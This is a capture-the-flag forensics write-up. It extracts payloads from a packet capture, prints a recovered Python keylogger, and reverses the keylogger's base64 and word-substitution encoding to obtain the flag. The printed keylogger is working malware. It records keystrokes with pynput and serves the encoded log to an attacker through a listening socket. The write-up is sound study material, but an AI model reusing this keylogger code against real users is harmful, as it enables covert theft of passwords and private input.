## Solution

We recieve another pcapng file, opening and examing it, we can find some codes in 17 and 18th packet, with a word list in the 41st packet, use tshark to extract first:
```
tshark -r c.pcapng -T fields -e data -e tcp.payload -e udp.payload -e icmp.data -e nbns | grep -v '^$' > payloads.hex
xxd -r -p payloads.hex > payloads.txt

-->
opning the txt:
...
import socket
import os
import base64
import time
from pynput import keyboard

key_logged = []
output_file = "keystroke.txt"
encoded_output_file = "keystroke_encoded.txt"
current_time = 0
stopping_time = 0
duration = 30
cipher = [
    "password",
    ...
    "london",
]
array64 = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=")

def run():
    set_time() #set current time and stopped time 
    # start the keyboard listener
    with keyboard.Listener(
            on_press=on_press,
            on_release=over_time) as listener:
        listener.join()

def set_time(): 
    global current_time, stopping_time
    current_time = time.time()
    stopping_time = current_time + duration

def on_press(key):  #detect when victim press the key
    global current_time
    current_time = time.time()
    try:
        key_logged.append(key.char)
    except AttributeError:
        key_logged.append(key)

def over_time(key):  #this function will stop the keylogger after a specific of time
    if current_time > stopping_time:
        # Stop listener
        return False

def write_to_file(keys_logged): #this function receive an array and write it value to a file
    with open(output_file, 'w') as file:
        for key in keys_logged:
            file.write(f"{key}\n") 


def Encode(): #Basically, this function will change the original text to something else. I believe you can figure how this work. A small hint is that it will impact to each character of the file
    payloadFile = open( output_file, 'rb' )
    payloadRaw = payloadFile.read()
    payloadB64 = base64.b64encode( payloadRaw )
    with open(encoded_output_file, "w") as file:
        for byte in payloadB64:
            if byte != '\n':
                file.write(cipher[ array64.index(chr(byte))] + '\n')


def transfer_file(): #This function will start a listening socket and wait for the attacker to connect to it, then transfer the logged file to the attacker's machine
    #create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.126.129", 1234)) 

    print("file is ready to tranfer")
    s.listen(10)
    c, addr = s.accept()

    f = open(encoded_output_file, "rb")
    l = os.path.getsize(encoded_output_file)
    m = f.read(l)
    c.sendall(m)
    f.close()

def main():
    run()
    write_to_file(key_logged)
    Encode()
    transfer_file()
    return 0

if __name__=="__main__":
    main()

some words...
'''
```

So the main function of this is to:
```
read the user keyboard input which would be the flag indivdually typed out
-->
put all the inputs together and turn into base64
-->
for each character it finds its index in the base64 list
-->
use the cipher[index] to get an encoded word and write each line into the output file, which is the word list
```

and we can reverse that, first, create a new txt file for the code to read (revt.txt) copying and pasting the lines inside
```
import base64

cipher = [...]
array64 = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=")
flag_chars = []

with open("revt.txt", "r") as file:
    for line in file.read().splitlines():
      flag_chars.append(array64[cipher.index(line)]) #append to list for each word then join together to form the line
b64_string = ''.join(flag_chars)

decoded = base64.b64decode(b64_string) #bytes

with open("flag.txt", "w") as f:
    f.write(decoded.decode(errors="ignore")) #texts
```
Opening the txt file:
```
p
e
c
a
n
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
Key.shift
{
k
3
y
l
o
...
```
and we can see the obstruction of Key.shift and Key.space, modify the code to remove them and join the lines: (final code)
```
import base64

cipher = ["password", "123456789", "sunshine", "qwerty", "iloveyou", "princess", "admin", "welcome", "666666", "abc123", "football", "monkey", "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "password1", "qwerty123", "letmein", "zxcvbnm", "login", "starwars", "121212", "bailey", "freedom", "shadow", "passw0rd", "master", "baseball", "buster", "Daniel", "Hannah", "Thomas", "summer", "George", "Harley", "222222", "Jessica", "ginger", "abcdef", "Jordan", "55555", "Tigger", "Joshua", "Pepper", "Robert", "Matthew", "Andrew", "lakers", "andrea", "1qaz2wsx", "sophie", "Ferrari", "Cheese", "Computer", "jesus", "Corvette", "Mercedes", "flower", "Blahblah", "Maverick", "Hello", "loveme", "nicole", "hunter", "amanda", "jennifer", "banana", "chelsea", "ranger", "trustno1", "merlin", "cookie", "ashley", "bandit", "killer", "aaaaaa", "1q2w3e", "zaq1zaq1", "mustang", "test", "hockey", "dallas", "whatever", "admin123", "michael", "liverpool", "querty", "william", "soccer", "london", ]

array64 = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=")
flag_chars = []

with open("revt.txt", "r") as file:
    for line in file.read().splitlines():
      flag_chars.append(array64[cipher.index(line)]) #append to list for each word then join together to form the line
b64_string = ''.join(flag_chars)

decoded = base64.b64decode(b64_string).decode()

with open("flag.txt", "w") as f:
    key_list = []
    for line in decoded.splitlines():
        if "Key.space" in line or "Key.shift" in line:
            continue
        key_list.append(line)
    f.write(''.join(key_list))
```
opening the txt gives the answer:
```
pecan{k3ylogger_p3c4n_2025}
```
